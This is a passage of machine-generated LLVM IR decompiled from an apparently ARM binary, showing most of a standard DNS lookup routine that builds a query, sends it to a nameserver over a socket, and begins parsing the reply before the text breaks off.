  uselistorder i32 %v5_1cdc8, { 1, 0 }
  uselistorder i32 %v1_1cda8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1cdcc59, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1cd8c62, { 2, 4, 3, 0, 1 }
  uselistorder i32 %v0_1ce3063, { 1, 0 }
  uselistorder i1 %v2_1ce3065, { 1, 0 }
  uselistorder i32 %v0_1cd5c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 2, 3, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1ce44, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_1cd98, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp152 = call i32 @__decompiler_undefined_function_0()
  %tmp164 = call i32 @__decompiler_undefined_function_0()
  %tmp165 = call i32 @__decompiler_undefined_function_0()
  %tmp166 = call i32 @__decompiler_undefined_function_0()
  %tmp180 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %v3_1ce4c = load i32, i32* @r4, align 4
  %v6_1ce4c = load i32, i32* @r5, align 4
  %v9_1ce4c = load i32, i32* @r6, align 4
  %v12_1ce4c = load i32, i32* @r7, align 4
  %v15_1ce4c = load i32, i32* @r8, align 4
  %v18_1ce4c = load i32, i32* @sb, align 4
  %v21_1ce4c = load i32, i32* @sl, align 4
  %v24_1ce4c = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_1ce60 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ce68 = call i32 @malloc(i32 512)
  store i32 %v1_1ce68, i32* @sl, align 4
  %v0_1ce70 = load i32, i32* @r4, align 4
  %v1_1ce70 = inttoptr i32 %v0_1ce70 to i8*
  %v3_1ce74 = call i32 @strlen(i8* %v1_1ce70)
  %v3_1ce7c = icmp ugt i32 %v3_1ce74, 893
  store i1 %v3_1ce7c, i1* %cpsr_c.global-to-local, align 1
  %tmp282 = icmp ugt i32 %v3_1ce74, 894
  br i1 %tmp282, label %.thread138, label %dec_label_pc_1ce98

.thread138:                                       ; preds = %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d550

dec_label_pc_1ce98:                               ; preds = %entry
  %v1_1ce9c = add i32 %v3_1ce74, 130
  %v1_1cea0 = call i32 @malloc(i32 %v1_1ce9c)
  store i32 %v1_1cea0, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cea4 = icmp eq i32 %v1_1cea0, 0
  br i1 %v2_1cea4, label %.thread10, label %bb

bb:                                               ; preds = %dec_label_pc_1ce98
  %v1_1cea8 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1cea8 = icmp eq i32 %v1_1cea8, 0
  br i1 %v3_1cea8, label %bb211, label %dec_label_pc_1cebc

.thread10:                                        ; preds = %dec_label_pc_1ce98
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1d548

bb211:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1d548

dec_label_pc_1cebc:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_1cebc = load i32, i32* @r4, align 4
  %v1_1cebc = inttoptr i32 %v0_1cebc to i8*
  %v2_1cebc = load i8, i8* %v1_1cebc, align 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cec0 = icmp eq i8 %v2_1cebc, 0
  br i1 %v2_1cec0, label %dec_label_pc_1d548, label %dec_label_pc_1cec8

dec_label_pc_1cec8:                               ; preds = %dec_label_pc_1cebc
  store i32 %v3_1ce74, i32* %ip.global-to-local, align 4
  %v2_1cecc = add i32 %v0_1cebc, %v3_1ce74
  %v1_1ced0 = add i32 %v2_1cecc, -1
  %v2_1ced0 = inttoptr i32 %v1_1ced0 to i8*
  %v3_1ced0 = load i8, i8* %v2_1ced0, align 1
  %v4_1ced0 = zext i8 %v3_1ced0 to i32
  store i32 %v0_1cebc, i32* @r1, align 4
  store i32 %v3_1ce74, i32* @r2, align 4
  %v0_1cee0 = call i32 @memcpy()
  store i32 %v1_1cea0, i32* %r1.global-to-local, align 4
  %v1_1ceec = add i32 %v3_1ce74, 1
  %v2_1cef4 = add i32 %v1_1ceec, %v1_1cea0
  %v0_1cefc = load i32, i32* @r5, align 4
  store i32 -1, i32* @sb, align 4
  %v2_1cf28 = ptrtoint i32* %stack_var_-72 to i32
  %v2_1d028 = ptrtoint i8* %stack_var_-100 to i32
  %v15_1d02c = ptrtoint i32* %stack_var_-84 to i32
  %v2_1d058 = ptrtoint i8* %stack_var_-188 to i32
  %v3_1d09c = bitcast i8* %stack_var_-188 to i32*
  %v3_1d100 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v2_1d134 = ptrtoint i32* %stack_var_-44 to i32
  %v9_1d154 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_1d1c8 = icmp eq i32 %tmp166, 0
  %v1_1d1d4 = add i32 %tmp165, -2
  %v2_1d1d8 = icmp ne i32 %v1_1d1d4, 0
  %tmp212 = icmp slt i32 %tmp164, 1
  %v5_1d4f461 = icmp sgt i32 %tmp164, 0
  %v2_1d2e0 = ptrtoint i32* %stack_var_-444 to i32
  %v2_1d3ec = ptrtoint i32* %stack_var_-140 to i32
  %v2_1d41c = icmp ne i32 %v0_1ce60, 0
  %v7_1d41c = icmp eq i32 %v0_1ce60, 1
  %v1_1d318 = bitcast i32* %stack_var_-444 to i8*
  %v2_1d3c4 = icmp eq i32 %tmp152, 0
  %v2_1d1e4 = icmp ugt i8 %v3_1ced0, 45
  %v7_1d1e4 = icmp eq i8 %v3_1ced0, 46
  %v2_1cf88 = inttoptr i32 %v2_1cef4 to i8*
  %v4_1cf64 = add i32 %v1_1cea0, %v3_1ce74
  %v5_1cf64 = inttoptr i32 %v4_1cf64 to i8*
  %v1_1d1d4.cmp = icmp ugt i32 %v1_1d1d4, 1
  %v2_1d20c = icmp eq i32 %tmp165, 0
  %v3_1d420 = icmp ugt i32 %v0_1ce60, 27
  %v8_1d420 = icmp eq i32 %v0_1ce60, 28
  br label %dec_label_pc_1cf0c

dec_label_pc_1cf0c:                               ; preds = %dec_label_pc_1d530, %dec_label_pc_1cec8
  %stack_var_-460.0 = phi i8 [ %tmp180, %dec_label_pc_1cec8 ], [ %v5_1d004, %dec_label_pc_1d530 ]
  %stack_var_-464.0 = phi i32 [ -1, %dec_label_pc_1cec8 ], [ %stack_var_-464.2, %dec_label_pc_1d530 ]
  %stack_var_-472.0 = phi i32 [ %v0_1cefc, %dec_label_pc_1cec8 ], [ %v1_1d534, %dec_label_pc_1d530 ]
  %v1_1cf14 = phi i32 [ -1, %dec_label_pc_1cec8 ], [ %v0_1d0e8, %dec_label_pc_1d530 ]
  %v2_1cf10 = icmp eq i32 %v1_1cf14, -1
  store i1 %v2_1cf10, i1* %cpsr_c.global-to-local, align 1
  %v7_1cf10 = icmp eq i32 %v1_1cf14, -1
  br i1 %v7_1cf10, label %bb214, label %bb213

bb213:                                            ; preds = %dec_label_pc_1cf0c
  br label %bb214

bb214:                                            ; preds = %dec_label_pc_1cf0c, %bb213
  %v1_1cf18 = xor i1 %v7_1cf10, true
  call void @__pseudo_cond_branch(i1 %v1_1cf18, i32 ptrtoint (i32* @global_var_142e0.1713 to i32))
  store i32 ptrtoint (i32* @global_var_34698.1715 to i32), i32* @r2, align 4
  store i32 98440, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v2_1cf28, i32* @r0, align 4
  %v1_1cf30 = call i32 @_pthread_cleanup_push_defer()
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* %r1.global-to-local, align 4
  %v2_1cf40 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_34698.1715 to i32))
  store i32 %v2_1cf40, i32* @r0, align 4
  %v1_1cf44 = call i32 @__open_nameservers(i32 %v2_1cf40)
  %v2_1cf4c = load i32, i32* @global_var_34aac.1720, align 4
  store i32 %v3_1ce74, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  %v0_1cf5c = load i32, i32* @sb, align 4
  %v3_1cf5c = icmp uge i32 %v0_1cf5c, %v2_1cf4c
  store i1 %v3_1cf5c, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_1cf64, align 1
  %v0_1cf68 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1cf68, label %dec_label_pc_1cf8c, label %dec_label_pc_1cf6c

dec_label_pc_1cf6c:                               ; preds = %bb214
  %v3_1cf74 = load i32, i32* %ip.global-to-local, align 4
  %v4_1cf74 = add i32 %v3_1cf74, %v1_1cea0
  %v5_1cf74 = inttoptr i32 %v4_1cf74 to i8*
  store i8 46, i8* %v5_1cf74, align 1
  store i32 ptrtoint (i32* @global_var_34aa0.1722 to i32), i32* %r1.global-to-local, align 4
  %v2_1cf7c = load i32, i32* @global_var_34aa0.1722, align 4
  %v1_1cf84 = load i32, i32* @sb, align 4
  %v2_1cf84 = and i32 %v1_1cf84, 1073741824
  %v3_1cf84 = icmp ne i32 %v2_1cf84, 0
  store i1 %v3_1cf84, i1* %cpsr_c.global-to-local, align 1
  %v4_1cf84 = mul i32 %v1_1cf84, 4
  %v5_1cf84 = add i32 %v4_1cf84, %v2_1cf7c
  %v6_1cf84 = inttoptr i32 %v5_1cf84 to i32*
  %v7_1cf84 = load i32, i32* %v6_1cf84, align 4
  store i32 %v7_1cf84, i32* @r1, align 4
  %v3_1cf88 = call i32 @strcpy(i8* %v2_1cf88, i32 %v7_1cf84)
  br label %dec_label_pc_1cf8c

dec_label_pc_1cf8c:                               ; preds = %bb214, %dec_label_pc_1cf6c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1cf90 = icmp slt i32 %stack_var_-464.0, 0
  br i1 %v1_1cf90, label %dec_label_pc_1cf98, label %dec_label_pc_1cf8c.dec_label_pc_1cfd0_crit_edge

dec_label_pc_1cf8c.dec_label_pc_1cfd0_crit_edge:  ; preds = %dec_label_pc_1cf8c
  %v2_1cfd8.pre = load i32, i32* @global_var_34aa8.1726, align 4
  br label %dec_label_pc_1cfd0

dec_label_pc_1cf98:                               ; preds = %dec_label_pc_1cf8c
  %v2_1cf9c = load i8, i8* bitcast (i8** @global_var_2e43b.1724 to i8*), align 4
  %v3_1cf9c = zext i8 %v2_1cf9c to i32
  %v2_1cfa4 = load i32, i32* @global_var_34aa8.1726, align 4
  %v2_1cfa8 = mul i32 %v2_1cfa4, %v3_1cf9c
  %v3_1cfbc = load i8, i8* @global_var_2e439.1731, align 1
  %v2_1cfc0 = load i32, i32* @global_var_34694.1730, align 4
  store i32 %v2_1cfc0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1cfd0

dec_label_pc_1cfd0:                               ; preds = %dec_label_pc_1cf8c.dec_label_pc_1cfd0_crit_edge, %dec_label_pc_1cf98
  %v2_1cfd8 = phi i32 [ %v2_1cfa4, %dec_label_pc_1cf98 ], [ %v2_1cfd8.pre, %dec_label_pc_1cf8c.dec_label_pc_1cfd0_crit_edge ]
  %stack_var_-460.1 = phi i8 [ %v3_1cfbc, %dec_label_pc_1cf98 ], [ %stack_var_-460.0, %dec_label_pc_1cf8c.dec_label_pc_1cfd0_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v2_1cfc0, %dec_label_pc_1cf98 ], [ %stack_var_-464.0, %dec_label_pc_1cf8c.dec_label_pc_1cfd0_crit_edge ]
  %stack_var_-472.1 = phi i32 [ %v2_1cfa8, %dec_label_pc_1cf98 ], [ %stack_var_-472.0, %dec_label_pc_1cf8c.dec_label_pc_1cfd0_crit_edge ]
  %v3_1cfe0 = icmp uge i32 %stack_var_-464.1, %v2_1cfd8
  store i1 %v3_1cfe0, i1* %cpsr_c.global-to-local, align 1
  %v2_1cfe4 = load i32, i32* @global_var_34aa4.1733, align 4
  br i1 %v3_1cfe0, label %bb215, label %bb216

bb215:                                            ; preds = %dec_label_pc_1cfd0
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_1cfd0, %bb215
  %v0_1d008 = phi i32 [ %stack_var_-464.1, %dec_label_pc_1cfd0 ], [ 0, %bb215 ]
  %v3_1cff0 = mul i32 %v0_1d008, 28
  %v4_1cff0 = add i32 %v3_1cff0, %v2_1cfe4
  %v4_1cff4 = sext i8 %stack_var_-460.1 to i32
  store i32 %v4_1cff4, i32* %ip.global-to-local, align 4
  %v1_1cff8 = add nsw i32 %v4_1cff4, 1
  %v5_1d004 = trunc i32 %v1_1cff8 to i8
  store i32 %v1_1cff8, i32* %r1.global-to-local, align 4
  %v1_1d014 = and i32 %v1_1cff8, 128
  %v2_1d014 = icmp ne i32 %v1_1d014, 0
  store i1 %v2_1d014, i1* %cpsr_c.global-to-local, align 1
  %v3_1d000 = udiv i32 %v1_1cff8, 256
  %v1_1d018 = trunc i32 %v3_1d000 to i8
  store i8 %v1_1d018, i8* bitcast (i8** @global_var_2e438.1728 to i8*), align 4
  store i8 %v5_1d004, i8* @global_var_2e439.1731, align 1
  %v1_1d024 = inttoptr i32 %v4_1cff0 to i32*
  %v2_1d024 = load i32, i32* %v1_1d024, align 4
  %v3_1d024 = add i32 %v4_1cff0, 4
  %v4_1d024 = inttoptr i32 %v3_1d024 to i32*
  %v5_1d024 = load i32, i32* %v4_1d024, align 4
  store i32 %v5_1d024, i32* %r1.global-to-local, align 4
  %v12_1d024 = add i32 %v4_1cff0, 16
  %v4_1d02c = trunc i32 %v2_1d024 to i8
  store i8 %v4_1d02c, i8* %stack_var_-100, align 1
  store i32 %v15_1d02c, i32* %ip.global-to-local, align 4
  %v1_1d030 = inttoptr i32 %v12_1d024 to i32*
  %v2_1d030 = load i32, i32* %v1_1d030, align 4
  store i32 %v2_1d030, i32* %stack_var_-84, align 4
  store i32 %v2_1cf28, i32* @r0, align 4
  store i32 %v0_1d008, i32* @global_var_34694.1730, align 4
  store i32 1, i32* @r1, align 4
  %v1_1d054 = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v2_1d058, i32* @r7, align 4
  %v0_1d05c = load i32, i32* @r8, align 4
  store i32 %v0_1d05c, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_1d064 = load i32, i32* @sl, align 4
  %v2_1d068 = inttoptr i32 %v0_1d064 to i8*
  %v3_1d068 = call i32 @__GI_memset(i8* %v2_1d068, i32 %v0_1d05c)
  %v0_1d06c = load i32, i32* @r8, align 4
  store i32 %v0_1d06c, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_1d078 = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 %v0_1d06c)
  store i32 %v1_1cff8, i32* %ip.global-to-local, align 4
  store i32 1, i32* @r6, align 4
  %v0_1d088 = load i32, i32* @sl, align 4
  store i32 %v0_1d088, i32* %r1.global-to-local, align 4
  store i8 %v5_1d004, i8* %stack_var_-188, align 1
  %v4_1d09c = call i32 @__encode_header(i32* %v3_1d09c, i32 %v0_1d088, i32 512)
  store i32 %v4_1d09c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d0a0 = icmp slt i32 %v4_1d09c, 0
  br i1 %v1_1d0a0, label %dec_label_pc_1d548, label %dec_label_pc_1d0a8

dec_label_pc_1d0a8:                               ; preds = %bb216
  store i32 %v0_1ce60, i32* @ip, align 4
  %v0_1d0b4 = load i32, i32* @sl, align 4
  %v2_1d0b4 = add i32 %v0_1d0b4, %v4_1d09c
  store i32 %v2_1d0b4, i32* %r1.global-to-local, align 4
  %v1_1d0b8 = sub i32 512, %v4_1d09c
  store i32 %v1_1cea0, i32* %stack_var_-56, align 4
  %v0_1d0c4 = load i32, i32* @r6, align 4
  %v8_1d0c8 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_1d0b4, i32 %v1_1d0b8, i32 %v1_1cea0, i32 %v1_1cea0, i32 %v0_1ce60, i32 %v0_1d0c4)
  store i32 %v8_1d0c8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d0cc = icmp slt i32 %v8_1d0c8, 0
  br i1 %v1_1d0cc, label %dec_label_pc_1d548, label %dec_label_pc_1d0d4

dec_label_pc_1d0d4:                               ; preds = %dec_label_pc_1d0a8
  %v3_1d0d4 = load i8, i8* %stack_var_-100, align 1
  %v4_1d0d4 = sext i8 %v3_1d0d4 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_1d0e0 = and i32 %v4_1d0d4, 16777216
  %v3_1d0e0 = icmp ne i32 %v2_1d0e0, 0
  store i1 %v3_1d0e0, i1* %cpsr_c.global-to-local, align 1
  %v0_1d0e8 = call i32 @socket()
  store i32 %v0_1d0e8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d0ec = icmp slt i32 %v0_1d0e8, 0
  br i1 %v1_1d0ec, label %dec_label_pc_1d520, label %dec_label_pc_1d0f8

dec_label_pc_1d0f8:                               ; preds = %dec_label_pc_1d0d4
  store i32 %v2_1d028, i32* %r1.global-to-local, align 4
  %v4_1d100 = call i32 @__libc_connect(i32 %v0_1d0e8, %sockaddr* nonnull %v3_1d100, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d104 = icmp slt i32 %v4_1d100, 0
  br i1 %v1_1d104, label %dec_label_pc_1d520, label %dec_label_pc_1d10c

dec_label_pc_1d10c:                               ; preds = %dec_label_pc_1d0f8
  %v0_1d10c = load i32, i32* @r5, align 4
  %v1_1d10c = load i32, i32* @r4, align 4
  %v2_1d10c = add i32 %v1_1d10c, %v0_1d10c
  %v0_1d110 = load i32, i32* @r8, align 4
  %v0_1d118 = load i32, i32* @sl, align 4
  store i32 %v0_1d118, i32* %r1.global-to-local, align 4
  %v4_1d11c = inttoptr i32 %v0_1d118 to i32*
  %v5_1d11c = call i32 @__libc_send(i32 %v0_1d0e8, i32* %v4_1d11c, i32 %v2_1d10c, i32 %v0_1d110)
  %v2_1d124 = load i8, i8* bitcast (i8** @global_var_2e43a.1736 to i8*), align 4
  %v3_1d124 = zext i8 %v2_1d124 to i32
  %v2_1d12c = mul nuw nsw i32 %v3_1d124, 1000
  store i32 %v2_1d12c, i32* @r4, align 4
  %v0_1d130 = load i32, i32* @r6, align 4
  store i32 %v0_1d130, i32* @r5, align 4
  store i32 %v2_1d134, i32* @r6, align 4
  br label %dec_label_pc_1d138

dec_label_pc_1d138:                               ; preds = %thread-pre-split.dec_label_pc_1d138_crit_edge, %dec_label_pc_1d10c
  %v0_1d140 = phi i32 [ %v1_1d180, %thread-pre-split.dec_label_pc_1d138_crit_edge ], [ %v2_1d12c, %dec_label_pc_1d10c ]
  %v0_1d150 = phi i32 [ %v0_1d13c.pre, %thread-pre-split.dec_label_pc_1d138_crit_edge ], [ %v0_1d130, %dec_label_pc_1d10c ]
  store i32 %v0_1d150, i32* %r1.global-to-local, align 4
  store i32 %v0_1d0e8, i32* %stack_var_-44, align 4
  %v0_1d14c = load i32, i32* @r8, align 4
  %sext = mul i32 %v0_1d14c, 16777216
  %v7_1d154 = sdiv i32 %sext, 16777216
  %sext7 = mul i32 %v0_1d150, 16777216
  %v8_1d154 = sdiv i32 %sext7, 16777216
  %v10_1d154 = call i32 @__GI_poll(%pollfd* %v9_1d154, i32 %v0_1d150, i32 %v0_1d140, i32 %v0_1d0e8, i32 %v0_1d0e8, i32 %v7_1d154, i32 %v8_1d154)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_1d15c = load i32, i32* @sl, align 4
  store i32 %v0_1d15c, i32* %r1.global-to-local, align 4
  %tmp217 = icmp slt i32 %v10_1d154, 1
  br i1 %tmp217, label %dec_label_pc_1d520, label %dec_label_pc_1d170

dec_label_pc_1d170:                               ; preds = %dec_label_pc_1d138
  %v5_1d170 = inttoptr i32 %v0_1d15c to i32*
  %v6_1d170 = call i32 @__libc_recv(i32 %v0_1d0e8, i32* %v5_1d170, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_1d174 = icmp ugt i32 %v6_1d170, 10
  store i1 %v2_1d174, i1* %cpsr_c.global-to-local, align 1
  %v8_1d17c = icmp sgt i32 %v6_1d170, 11
  br i1 %v8_1d17c, label %dec_label_pc_1d1a8, label %dec_label_pc_1d180

dec_label_pc_1d180:                               ; preds = %dec_label_pc_1d1a8, %dec_label_pc_1d1c4, %dec_label_pc_1d170
  %v0_1d180 = load i32, i32* @r4, align 4
  %v1_1d180 = add i32 %v0_1d180, -1000
  store i32 %v1_1d180, i32* @r4, align 4
  store i32 %v6_1d170, i32* @ip, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d190 = icmp slt i32 %v6_1d170, 0
  br i1 %v1_1d190, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_1d180
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1d520

thread-pre-split:                                 ; preds = %dec_label_pc_1d180
  %v7_1d180 = icmp eq i32 %v0_1d180, 1000
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1d180, label %dec_label_pc_1d520, label %thread-pre-split.dec_label_pc_1d138_crit_edge

thread-pre-split.dec_label_pc_1d138_crit_edge:    ; preds = %thread-pre-split
  %v0_1d13c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1d138

dec_label_pc_1d1a8:                               ; preds = %dec_label_pc_1d170
  %v0_1d1a8 = load i32, i32* @sl, align 4
  store i32 %v2_1d058, i32* %r1.global-to-local, align 4
  %v2_1d1b0 = inttoptr i32 %v0_1d1a8 to i8*
  %v3_1d1b0 = call i32 @__decode_header(i8* %v2_1d1b0, i32 %v2_1d058)
  %v3_1d1b4 = load i8, i8* %stack_var_-188, align 1
  %v3_1d1bc = icmp uge i8 %v3_1d1b4, %v5_1d004
  store i1 %v3_1d1bc, i1* %cpsr_c.global-to-local, align 1
  %v9_1d1bc = icmp eq i8 %v3_1d1b4, %v5_1d004
  br i1 %v9_1d1bc, label %dec_label_pc_1d1c4, label %dec_label_pc_1d180

dec_label_pc_1d1c4:                               ; preds = %dec_label_pc_1d1a8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d1c8, label %dec_label_pc_1d180, label %dec_label_pc_1d1d0

dec_label_pc_1d1d0:                               ; preds = %dec_label_pc_1d1c4
  store i1 %v2_1d1d8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_1d1d4.cmp, label %dec_label_pc_1d20c, label %dec_label_pc_1d1e0

dec_label_pc_1d1e0:                               ; preds = %dec_label_pc_1d1d0
  store i32 %v4_1ced0, i32* %r1.global-to-local, align 4
  store i1 %v2_1d1e4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1d1e4, label %dec_label_pc_1d200, label %dec_label_pc_1d1ec

dec_label_pc_1d1ec:                               ; preds = %dec_label_pc_1d1e0
  %v1_1d1f0 = add i32 %v2_1cf4c, -1
  %v0_1d1f4 = load i32, i32* @sb, align 4
  %v3_1d1f4 = icmp uge i32 %v0_1d1f4, %v1_1d1f0
  store i1 %v3_1d1f4, i1* %cpsr_c.global-to-local, align 1
  %v5_1d1f8 = icmp slt i32 %v0_1d1f4, %v1_1d1f0
  br i1 %v5_1d1f8, label %.thread12, label %dec_label_pc_1d200

.thread12:                                        ; preds = %dec_label_pc_1d1ec
  %v7_1d1f8 = add i32 %v0_1d1f4, 1
  br label %dec_label_pc_1d530

dec_label_pc_1d200:                               ; preds = %dec_label_pc_1d1ec, %dec_label_pc_1d1e0
  %v0_1d200 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1d234

dec_label_pc_1d20c:                               ; preds = %dec_label_pc_1d1d0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d20c, label %dec_label_pc_1d214, label %dec_label_pc_1d520

dec_label_pc_1d214:                               ; preds = %dec_label_pc_1d20c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp212, label %dec_label_pc_1d22c, label %dec_label_pc_1d23c

dec_label_pc_1d22c:                               ; preds = %dec_label_pc_1d214
  %v0_1d22c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1d234

dec_label_pc_1d234:                               ; preds = %dec_label_pc_1d200, %dec_label_pc_1d22c
  %storemerge5 = phi i32 [ %v0_1d22c, %dec_label_pc_1d22c ], [ %v0_1d200, %dec_label_pc_1d200 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1d22c ], [ 1, %dec_label_pc_1d200 ]
  %v2_1d234 = inttoptr i32 %storemerge5 to i32*
  store i32 %storemerge, i32* %v2_1d234, align 4
  br label %dec_label_pc_1d568

dec_label_pc_1d23c:                               ; preds = %dec_label_pc_1d214
  store i32 0, i32* @r5, align 4
  %v0_1d240.pre = load i32, i32* @sl, align 4
  store i32 12, i32* %ip.global-to-local, align 4
  %v2_1d240 = add i32 %v0_1d240.pre, 12
  store i32 %v2_1d240, i32* @r4, align 4
  %v3_1d240 = icmp ugt i32 %v0_1d240.pre, -13
  store i1 %v3_1d240, i1* %cpsr_c.global-to-local, align 1
  %v9_1d240 = icmp eq i32 %v2_1d240, 0
  br i1 %v9_1d240, label %dec_label_pc_1d520, label %dec_label_pc_1d248

dec_label_pc_1d248:                               ; preds = %dec_label_pc_1d23c
  %v2_1d24c = add i32 %v6_1d170, -12
  store i32 %v2_1d24c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp220 = icmp slt i32 %v2_1d24c, 1
  br i1 %tmp220, label %dec_label_pc_1d520, label %dec_label_pc_1d25c

dec_label_pc_1d254thread-pre-split:               ; preds = %dec_label_pc_1d278
  %v2_1d28420 = add i32 %v2_1d268, -1
  store i32 %v2_1d28420, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp221 = icmp slt i32 %v2_1d28420, 1
  br i1 %tmp221, label %dec_label_pc_1d520, label %dec_label_pc_1d25c

dec_label_pc_1d25c:                               ; preds = %dec_label_pc_1d248, %dec_label_pc_1d254thread-pre-split
  %v1_1d280 = phi i32 [ %v2_1d28420, %dec_label_pc_1d254thread-pre-split ], [ %v2_1d24c, %dec_label_pc_1d248 ]
  %v0_1d25c = phi i32 [ %v2_1d270, %dec_label_pc_1d254thread-pre-split ], [ %v2_1d240, %dec_label_pc_1d248 ]
  %v1_1d25c = inttoptr i32 %v0_1d25c to i8*
  %v2_1d25c = load i8, i8* %v1_1d25c, align 1
  %v3_1d25c = zext i8 %v2_1d25c to i32
  %v5_1d25c = add i32 %v0_1d25c, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d260 = icmp eq i8 %v2_1d25c, 0
  %v2_1d268 = sub i32 %v1_1d280, %v3_1d25c
  store i32 %v2_1d268, i32* @lr, align 4
  %v1_1d26c = and i32 %v3_1d25c, 192
  store i32 %v1_1d26c, i32* @ip, align 4
  %v2_1d270 = add i32 %v3_1d25c, %v5_1d25c
  br i1 %v2_1d260, label %dec_label_pc_1d28c, label %dec_label_pc_1d278

dec_label_pc_1d278:                               ; preds = %dec_label_pc_1d25c
  %v2_1d278 = icmp eq i32 %v1_1d26c, 192
  store i1 %v2_1d278, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d278, label %.thread14, label %dec_label_pc_1d254thread-pre-split

.thread14:                                        ; preds = %dec_label_pc_1d278
  %v2_1d27c = add i32 %v0_1d25c, 2
  %v2_1d280 = add i32 %v1_1d280, -2
  store i32 %v2_1d280, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d28c

dec_label_pc_1d28c:                               ; preds = %dec_label_pc_1d25c, %.thread14
  %v1_1d298 = phi i32 [ %v2_1d27c, %.thread14 ], [ %v5_1d25c, %dec_label_pc_1d25c ]
  %v0_1d28c = phi i32 [ %v2_1d280, %.thread14 ], [ %v1_1d280, %dec_label_pc_1d25c ]
  %v1_1d28c = add i32 %v0_1d28c, -3
  %v2_1d28c = icmp ugt i32 %v0_1d28c, 2
  store i1 %v2_1d28c, i1* %cpsr_c.global-to-local, align 1
  %v3_1d28c = sub i32 2, %v0_1d28c
